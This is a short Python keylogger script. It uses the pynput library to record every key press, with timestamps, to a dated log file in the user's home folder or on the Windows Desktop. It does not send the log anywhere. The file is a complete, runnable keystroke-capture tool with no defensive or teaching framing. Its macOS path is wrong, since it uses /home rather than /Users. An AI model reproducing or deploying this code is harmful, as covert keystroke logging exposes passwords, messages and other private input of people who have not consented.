import getpass
import shutil
import logging
from pynput.keyboard import Listener as KeyListener
from datetime import datetime
from sys import platform

username = getpass.getuser()

logs_dir = ""
if platform == "linux" or platform == "linux2" or platform == "darwin": # linux or OS X
    logs_dir = f"/home/{username}"
elif platform == "win32": # Windows
    logs_dir = f"C:/Users/{username}/Desktop"
else: 
    raise ValueError("Unknown OS - cannot determine where to store the log!")

log_file = datetime.today().strftime('%Y-%m-%d')
logging.basicConfig(filename=f"{logs_dir}/{log_file}.log", level=logging.DEBUG, format="%(asctime)s: %(message)s")


def key_handler(key):
    logging.info(key)


with KeyListener(on_press=key_handler) as listener:
    listener.join()